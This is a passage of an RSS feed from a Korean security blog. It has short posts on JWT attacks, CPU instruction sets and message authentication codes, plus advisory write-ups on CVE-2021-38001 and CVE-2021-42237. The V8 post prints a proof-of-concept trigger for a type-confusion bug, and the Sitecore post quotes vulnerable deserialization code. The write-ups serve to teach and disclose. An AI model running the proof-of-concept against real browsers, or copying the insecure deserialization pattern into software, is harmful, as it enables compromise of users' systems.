&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><strong>Information leak:</strong> JSON &#xC6F9; &#xD1A0;&#xD070;&#xC740; &#xC561;&#xC138;&#xC2A4; &#xC81C;&#xC5B4;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xBBC0;&#xB85C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD1A0;&#xD070;&#xC774; &#xC554;&#xD638;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; &#xB204;&#xAD6C;&#xB098; base64URL&#xB85C; &#xD1A0;&#xD070;&#xC744; &#xB514;&#xCF54;&#xB529;&#xD558;&#xACE0; &#xD1A0;&#xD070;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD1A0;&#xD070;&#xC5D0; &#xBBFC;&#xAC10;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; &#xC815;&#xBCF4; &#xC720;&#xCD9C;&#xC758; &#xC6D0;&#xC778;&#xC774; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>Command injection:</strong> <code>KID</code> &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xAC00; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xD30C;&#xC77C; &#xC77D;&#xAE30; &#xC791;&#xC5C5;&#xC5D0; &#xC9C1;&#xC811; &#xC804;&#xB2EC;&#xB420; &#xB54C; &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>KID</code> &#xD30C;&#xC77C; &#xC774;&#xB984; &#xB4A4;&#xC758; &#xC785;&#xB825;&#xC5D0; &#xBA85;&#xB839;&#xC744; &#xAC04;&#xB2E8;&#xD788; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC2DC;&#xC2A4;&#xD15C; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol></li></ul><p>&#xC774;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xB2E4; &#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; <a href="https://www.notion.so/Hacking-JSON-Web-Tokens-JWTs-0792026606194f1b8a6e0d083dc83e03">URL</a>&#xC5D0;&#xC11C; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/IN-0Hack/">IN&#39;0Hack</category>
      
      <category domain="https://hackyboiz.github.io/tags/web/">web</category>
      
      <category domain="https://hackyboiz.github.io/tags/JWT/">JWT</category>
      
      <category domain="https://hackyboiz.github.io/tags/token/">token</category>
      
      <category domain="https://hackyboiz.github.io/tags/json/">json</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/20/in0hack/2021-11-20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] ISA(Instruction Set Architecture)</title>
      <link>https://hackyboiz.github.io/2021/11/19/poosic/ISA/</link>
      <guid>https://hackyboiz.github.io/2021/11/19/poosic/ISA/</guid>
      <pubDate>Fri, 19 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;ISA&quot;&gt;&lt;a href=&quot;#ISA&quot; class=&quot;headerlink&quot; title=&quot;ISA&quot;&gt;&lt;/a&gt;ISA&lt;/h2&gt;&lt;p&gt;ISA(Instruction Set Architecture)&amp;#xB294; CPU&amp;#xAC00; &amp;#xAE30;&amp;#xB</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="ISA"><a href="#ISA" class="headerlink" title="ISA"></a>ISA</h2><p>ISA(Instruction Set Architecture)&#xB294; CPU&#xAC00; &#xAE30;&#xB2A5;&#xC744; &#xC774;&#xD574;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; 0&#xACFC; 1&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xAE30;&#xACC4;&#xC5B4; &#xBA85;&#xB839;&#xC758; &#xC9D1;&#xD569;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. &#xBA54;&#xBAA8;&#xB9AC; &#xAD6C;&#xC870;, &#xC608;&#xC678; &#xCC98;&#xB9AC; &#xB4F1;&#xACFC; &#xD568;&#xAED8; &#xCEF4;&#xD4E8;&#xD130; &#xAD6C;&#xC870;&#xC758; &#xC77C;&#xBD80;&#xB85C;&#xC368; &#xCEF4;&#xD4E8;&#xD130;&#xC758; &#xC791;&#xB3D9;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC0AC;&#xCE59;&#xC5F0;&#xC0B0;, &#xB17C;&#xB9AC;&#xC5F0;&#xC0B0;, &#xB370;&#xC774;&#xD130; &#xC804;&#xC1A1;, &#xC2E4;&#xD589;&#xC81C;&#xC5B4;, &#xC778;&#xD130;&#xB7FD;&#xD2B8; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xB3D9;&#xC791;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB4E4;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xD45C;&#xC801;&#xC778; ISA&#xC758; &#xC608;&#xC2DC;&#xB85C;&#xB294; IA-32, IA-64, AMD64, MIPS &#xB4F1;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="ISA&#xAC00;-&#xB2E4;&#xC591;&#xD55C;-&#xC774;&#xC720;"><a href="#ISA&#xAC00;-&#xB2E4;&#xC591;&#xD55C;-&#xC774;&#xC720;" class="headerlink" title="ISA&#xAC00; &#xB2E4;&#xC591;&#xD55C; &#xC774;&#xC720;"></a>ISA&#xAC00; &#xB2E4;&#xC591;&#xD55C; &#xC774;&#xC720;</h2><p>ISA&#xAC00; &#xB2E4;&#xC591;&#xD55C; &#xC774;&#xC720;&#xB294; CPU&#xAC00; &#xB2E4;&#xC591;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC778;&#xB370;&#xC694;. CPU&#xB9C8;&#xB2E4; &#xAD6C;&#xC870;&#xAC00; &#xB2E4;&#xB974;&#xBBC0;&#xB85C; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xB3C4; &#xB2EC;&#xB77C;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xAC01; CPU&#xB9C8;&#xB2E4; &#xADF8;&#xC5D0; &#xB9DE;&#xB294; ISA&#xAC00; &#xC874;&#xC7AC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; CPU&#xB294; &#xC65C; &#xB2E4;&#xC591;&#xD55C; &#xAC78;&#xAE4C;&#xC694;?</p><p>CPU&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB2E4;&#xC591;&#xD55C; &#xD615;&#xD0DC;&#xB85C; &#xD544;&#xC694;&#xB85C; &#xD574;&#xC11C; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; CPU&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xB370;&#xC2A4;&#xD06C;&#xD0D1;&#xC5D0;&#xB294; &#xCFE8;&#xB9C1; &#xD32C;&#xC744; &#xC7A5;&#xCC29;&#xD560; &#xACF5;&#xAC04;&#xC774; &#xC788;&#xC5B4;&#xC11C; &#xBC1C;&#xC5F4;&#xC774; &#xC2EC;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC131;&#xB2A5;&#xC774; &#xC88B;&#xC740; CPU&#xB97C; &#xD544;&#xC694;&#xB85C; &#xD558;&#xACE0;, &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0;&#xACFC; &#xAC19;&#xC740; &#xAE30;&#xAE30;&#xC5D0;&#xB294; &#xCFE8;&#xB9C1; &#xD32C;&#xC744; &#xC7A5;&#xCC29;&#xD560; &#xACF5;&#xAC04;&#xC774; &#xC5C6;&#xC5B4;&#xC11C; &#xC131;&#xB2A5;&#xC774; &#xB2E4;&#xC18C; &#xB5A8;&#xC5B4;&#xC9C0;&#xB354;&#xB77C;&#xB3C4; &#xBC1C;&#xC5F4;&#xC774; &#xC2EC;&#xD558;&#xC9C0; &#xC54A;&#xC740; CPU&#xB97C; &#xC694;&#xAD6C;&#xD558;&#xACA0;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xB2E4;&#xC591;&#xD55C; CPU &#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xADF8;&#xC5D0; &#xB9DE;&#xB294; &#xB2E4;&#xC591;&#xD55C; ISA &#xB4E4;&#xC774; &#xD544;&#xC694;&#xB85C; &#xD558;&#xAC8C; &#xB41C; &#xAC83;&#xC774;&#xC8E0;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/isa/">isa</category>
      
      <category domain="https://hackyboiz.github.io/tags/instruction-set/">instruction set</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/19/poosic/ISA/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-38001: Chrome V8의 Type Confusion 취약점</title>
      <link>https://hackyboiz.github.io/2021/11/18/l0ch/2021-11-18/</link>
      <guid>https://hackyboiz.github.io/2021/11/18/l0ch/2021-11-18/</guid>
      <pubDate>Thu, 18 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/vngkv123/articles/blob/main/CVE-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/vngkv123/articles/blob/main/CVE-2021-38001.md">https://github.com/vngkv123/articles/blob/main/CVE-2021-38001.md</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Chrome V8</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC9C0;&#xB09C; 8&#xC6D4;&#xC5D0; &#xC774;&#xC5B4; Chrome&#xC758; V8 &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C; Type Connfusion &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; PoC &#xBC0F; &#xC0C1;&#xC138; &#xC815;&#xBCF4;&#xAC00;  &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong><a href="https://hackyboiz.github.io/2021/08/17/l0ch/2021-08-17/">CVE-2021-30517: Chrome V8 &#xC5D4;&#xC9C4;&#xC758; Type Confusion &#xCDE8;&#xC57D;&#xC810;</a></strong></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBBF8;&#xC2A4;&#xB41C; &#xCE90;&#xC2DC;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C;  <code>[accessor-assembler.cc](&lt;http://accessor-assembler.cc&gt;)</code>&#xC640; <code>ic.cc</code> &#xC0AC;&#xC774;&#xC5D0; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740;  <code>accessor-assembler.cc</code> &#xC758; &#xCF54;&#xB4DC; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">//accessor-assembler.cc</span>Comment(<span class="hljs-string">&quot;module export&quot;</span>);TNode&lt;UintPtrT&gt; index =DecodeWord&lt;LoadHandler::ExportsIndexBits&gt;(handler_word);<span class="hljs-comment">// p-&gt;receiver&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD574; &#xC18D;&#xC131; &#xC811;&#xADFC;</span>TNode&lt;Module&gt; <span class="hljs-keyword">module</span> = LoadObjectField&lt;Module&gt;(CAST(p-&gt;receiver()), JSModuleNamespace::kModuleOffset);TNode&lt;ObjectHashTable&gt; exports =LoadObjectField&lt;ObjectHashTable&gt;(<span class="hljs-keyword">module</span>, Module::kExportsOffset);TNode&lt;Cell&gt; cell = CAST(LoadFixedArrayElement(exports, index));</code></pre><p>&#xCE90;&#xC2DC; &#xBBF8;&#xC2A4;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; <code>ComputeHander</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xCE90;&#xC2DC;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD569;&#xB2C8;&#xB2E4;. <code>ic.cc</code>&#xB294; <code>JSModuleNamespace</code>&#xC758; <code>lookup_start_object(holer)</code>&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCE90;&#xC2DC;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xC9C0;&#xB9CC; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD6C4; <code>accessor-assembler.cc</code>&#xC5D0;&#xC11C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xC2E4;&#xC81C; &#xC18D;&#xC131; &#xC561;&#xC138;&#xC2A4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; <code>JSModuleNamespace</code>&#xC5D0; &#xC5C6;&#xB294; <code>receiver</code> &#xAC1D;&#xCCB4;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>receiver</code>&#xC640; <code>lookup_start_object(holder)</code>&#xAC00; &#xB2E4;&#xB974;&#xBA74; Type Confusion&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">import</span> * as <span class="hljs-keyword">module</span> from <span class="hljs-string">&quot;1.mjs&quot;</span>;<span class="hljs-function">function <span class="hljs-title">poc</span><span class="hljs-params">()</span> </span>{    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> {</span>        m() {            <span class="hljs-keyword">return</span> super.y;        }    }    let zz = {aa: <span class="hljs-number">1</span>, bb: <span class="hljs-number">2</span>};    <span class="hljs-comment">// receiver vs holder type confusion</span>    <span class="hljs-function">function <span class="hljs-title">trigger</span><span class="hljs-params">()</span> </span>{        <span class="hljs-comment">// set lookup_start_object</span>        C.prototype.__proto__ = zz;        <span class="hljs-comment">// set holder</span>        C.prototype.__proto__.__proto__ = <span class="hljs-keyword">module</span>;        <span class="hljs-comment">// &quot;c&quot; is receiver in ComputeHandler [ic.cc]</span>        <span class="hljs-comment">// &quot;module&quot; is holder</span>        <span class="hljs-comment">// &quot;zz&quot; is lookup_start_object</span>        let c = <span class="hljs-keyword">new</span> C();        c.x0 = <span class="hljs-number">0x42424242</span> / <span class="hljs-number">2</span>;        c.x1 = <span class="hljs-number">0x42424242</span> / <span class="hljs-number">2</span>;        c.x2 = <span class="hljs-number">0x42424242</span> / <span class="hljs-number">2</span>;        c.x3 = <span class="hljs-number">0x42424242</span> / <span class="hljs-number">2</span>;        c.x4 = <span class="hljs-number">0x42424242</span> / <span class="hljs-number">2</span>;        <span class="hljs-comment">// LoadWithReceiverIC_Miss</span>        <span class="hljs-comment">// =&gt; UpdateCaches (Monomorphic)</span>        <span class="hljs-comment">// CheckObjectType with &quot;receiver&quot;</span>        let res = c.m();    }        <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++) {        trigger();    }}poc();</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/v8/">v8</category>
      
      <category domain="https://hackyboiz.github.io/tags/type-confusion/">type confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-38001/">cve-2021-38001</category>
      
      <category domain="https://hackyboiz.github.io/tags/cache/">cache</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/18/l0ch/2021-11-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237</title>
      <link>https://hackyboiz.github.io/2021/11/16/fabu1ous/2021-11-16/</link>
      <guid>https://hackyboiz.github.io/2021/11/16/fabu1ous/2021-11-16/</guid>
      <pubDate>Tue, 16 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.assetnote.io/2021/11/02/sitecore-rce/&quot;&gt;Sitec</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.assetnote.io/2021/11/02/sitecore-rce/">Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><ul><li>Sitecore XP 7.5 Initial Release - Sitecore XP 7.5 Update-2</li><li>Sitecore XP 8.0 Initial Release - Sitecore XP 8.0 Update-7</li><li>Sitecore XP 8.1 Initial Release - Sitecore XP 8.1 Update-3</li><li>Sitecore XP 8.2 Initial Release - Sitecore XP 8.2 Update-7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Enterprise CMS (Content Management System)&#xC778; Sitecore XP&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Sitecore XP&#xB294; &#xC18C;&#xBE44;&#xC790; &#xB370;&#xC774;&#xD130;, &#xD1B5;&#xACC4;, &#xB9C8;&#xCF00;&#xD305; &#xC790;&#xB3D9;&#xD654;&#xB4F1;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xD234;&#xC785;&#xB2C8;&#xB2E4;. Sitecore XP&#xB294; .NET&#xC73C;&#xB85C; &#xAC1C;&#xBC1C;&#xB418;&#xC5C8;&#xB294;&#xB370; <a href="https://docs.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca2310">insecure deserialization</a> &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; <code>NetDataContractSerializer</code>&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC6D0;&#xACA9; &#xCEE4;&#xBA58;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>POST request&#xC758; XML node&#xC5D0; &#xB530;&#xB77C; &#xADF8;&#xC5D0; &#xB9DE;&#xB294; deserialization &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; <code>DeserializeParameters</code>&#xB294; <code>NetDataContractSerializer</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; insecure desrialization &#xD328;&#xD134;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> static void <span class="hljs-constructor">DeserializeParameters(XmlReader <span class="hljs-params">reader</span>, Dictionary&lt;<span class="hljs-params">string</span>, <span class="hljs-params">object</span>&gt; <span class="hljs-params">parameters</span>)</span>{reader.<span class="hljs-constructor">ReadStartElement(<span class="hljs-string">&quot;parameters&quot;</span>)</span>;<span class="hljs-built_in">bool</span> flag = !reader.EOF;<span class="hljs-keyword">while</span> (flag){<span class="hljs-keyword">if</span> (reader.NodeType<span class="hljs-operator"> == </span>XmlNodeType.Element<span class="hljs-operator"> &amp;&amp; </span>reader.Name<span class="hljs-operator"> == </span><span class="hljs-string">&quot;parameter&quot;</span>){reader.<span class="hljs-constructor">MoveToContent()</span>;<span class="hljs-built_in">string</span> attribute = reader.<span class="hljs-constructor">GetAttribute(<span class="hljs-string">&quot;name&quot;</span>)</span>;<span class="hljs-keyword">if</span> (attribute != null){<span class="hljs-keyword">for</span> (<span class="hljs-built_in">bool</span> flag2 = reader.<span class="hljs-constructor">Read()</span>; flag2<span class="hljs-operator"> &amp;&amp; </span>reader.NodeType != XmlNodeType.Element; flag2 = reader.<span class="hljs-constructor">Read()</span>){}<span class="hljs-keyword">object</span> value = <span class="hljs-keyword">new</span> <span class="hljs-constructor">NetDataContractSerializer()</span>.<span class="hljs-constructor">ReadObject(<span class="hljs-params">reader</span>, <span class="hljs-params">verifyObjectName</span>: <span class="hljs-params">true</span>)</span>;parameters.<span class="hljs-constructor">Add(<span class="hljs-params">attribute</span>, <span class="hljs-params">value</span>)</span>;}}flag = reader.<span class="hljs-constructor">Read()</span>;}}</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/sitecore/">sitecore</category>
      
      <category domain="https://hackyboiz.github.io/tags/deserialize/">deserialize</category>
      
      <category domain="https://hackyboiz.github.io/tags/xml/">xml</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/16/fabu1ous/2021-11-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] MAC(Message Authentication Code)</title>
      <link>https://hackyboiz.github.io/2021/11/16/y00n_nms/mac/</link>
      <guid>https://hackyboiz.github.io/2021/11/16/y00n_nms/mac/</guid>
      <pubDate>Tue, 16 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;strong&gt;MAC(Message Authentication Code)&lt;/strong&gt; &amp;#xC54C;&amp;#xACE0;&amp;#xB9AC;&amp;#xC998;&amp;#xC740; &amp;#xBA54;&amp;#xC2DC;&amp;#xC9C0;&amp;#xC758; &lt;strong&gt;&amp;#xBB</description>
        
      
      
      
      <content:encoded><![CDATA[<p><strong>MAC(Message Authentication Code)</strong> &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xBA54;&#xC2DC;&#xC9C0;&#xC758; <strong>&#xBB34;&#xACB0;&#xC131;&#xACFC; &#xC778;&#xC99D;&#xC131;</strong>(&#xCD9C;&#xCC98;&#xAC00; &#xBD84;&#xBA85;&#xD568;)&#xC744; &#xBCF4;&#xD638;&#xD569;&#xB2C8;&#xB2E4;. &#xC1A1;&#xC2E0;&#xC790;&#xC640; &#xC218;&#xC2E0;&#xC790;&#xAC00; &#xACF5;&#xC720;&#xD558;&#xB294; &#xD0A4; K, &#xACF5;&#xC720;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xBA54;&#xC138;&#xC9C0; M&#xC73C;&#xB85C;  <code>T = MAC(K, M)</code>&#xC774;&#xB77C;&#xB294; &#xAC12;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC5EC; T&#xB97C; M&#xC758; &#xC778;&#xC99D;&#xAC12;(Authentication tag) &#xB610;&#xB294; &#xB2E8;&#xC21C;&#xD788; MAC&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Alice&#xC640; Bob&#xC774; &#xD0A4; K&#xB97C; &#xACF5;&#xC720;&#xD558;&#xACE0; &#xC788;&#xC744; &#xB54C;, Bob&#xC774; Alice&#xC5D0;&#xAC8C; &#xBA54;&#xC138;&#xC9C0; M&#xACFC; T=MAC(K, M), &#xC989; &#xC778;&#xC99D;&#xAC12;(MAC)&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; &#xBCF4;&#xB0B4;&#xBA74; Alice&#xB294; &#xBC1B;&#xC740; &#xBA54;&#xC138;&#xC9C0;&#xB85C; MAC(K, M)&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; &#xBC1B;&#xC740; &#xC778;&#xC99D;&#xAC12;&#xACFC; &#xB3D9;&#xC77C;&#xD55C;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB3D9;&#xC77C;&#xD558;&#xB2E4;&#xBA74; &#xBC1B;&#xC740; &#xBA54;&#xC138;&#xC9C0;&#xAC00; &#xC911;&#xAC04;&#xC5D0; &#xBCC0;&#xC870;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;&#xB294; &#xBB34;&#xACB0;&#xC131;&#xACFC;, &#xD0A4; K&#xB294; Alice&#xC640; Bob&#xB9CC; &#xACF5;&#xC720;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B8; &#xAC83;&#xC774; Bob&#xC774;&#xB77C;&#xB294; &#xC778;&#xC99D;&#xC131;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Alice&#xAC00; Bob&#xC5D0;&#xAC8C; &#xBCF4;&#xB0B8; &#xBA54;&#xC138;&#xC9C0; M&#xACFC; &#xC778;&#xC99D;&#xAC12; MAC&#xC744; &#xB9CC;&#xC57D; &#xC911;&#xAC04;&#xC5D0; &#xACF5;&#xACA9;&#xC790; Trudy&#xAC00; &#xB3C4;&#xCCAD; &#xB4F1;&#xC73C;&#xB85C; &#xC5BB;&#xAC8C;&#xB41C;&#xB2E4;&#xBA74;, &#xB2E4;&#xC2DC; Bob&#xC5D0;&#xAC8C; M&#xACFC; MAC&#xC744; &#xBCF4;&#xB0B4; Alice&#xC778; &#xCC99;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC7AC;&#xC804;&#xC1A1; &#xACF5;&#xACA9;(reply attack)&#xC774;&#xB77C;&#xACE0; &#xD558;&#xBA70;, &#xB9C9;&#xAE30; &#xC704;&#xD558;&#xC5EC; &#xB2E4;&#xC74C; &#xC138; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>sequence number: &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xBCF4;&#xB0BC;&#xB54C; &#xB9C8;&#xB2E4; 1&#xC529; &#xC99D;&#xAC00;&#xD558;&#xB294; &#xBA54;&#xC138;&#xC9C0; &#xC21C;&#xC11C; &#xBC88;&#xD638;&#xB97C; &#xB123;&#xB294;&#xB2E4;.</li><li>time stamp: &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xBCF4;&#xB0BC; &#xB54C; &#xD604;&#xC7AC; &#xC2DC;&#xAC01;&#xC744; &#xD568;&#xAED8; &#xB123;&#xB294;&#xB2E4;.</li><li>nonce: &#xC218;&#xC2E0;&#xC790;&#xB294; &#xC1A1;&#xC2E0;&#xC790;&#xC5D0;&#xAC8C; &#xC77C;&#xD68C;&#xC6A9;&#xC73C;&#xB85C; &#xB79C;&#xB364; &#xAC12;&#xC744; &#xC8FC;&#xC5B4; &#xD574;&#xB2F9; &#xB17C;&#xC2A4;&#xB85C; MAC&#xC744; &#xACC4;&#xC0B0;&#xD55C;&#xB2E4;.</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mac/">mac</category>
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
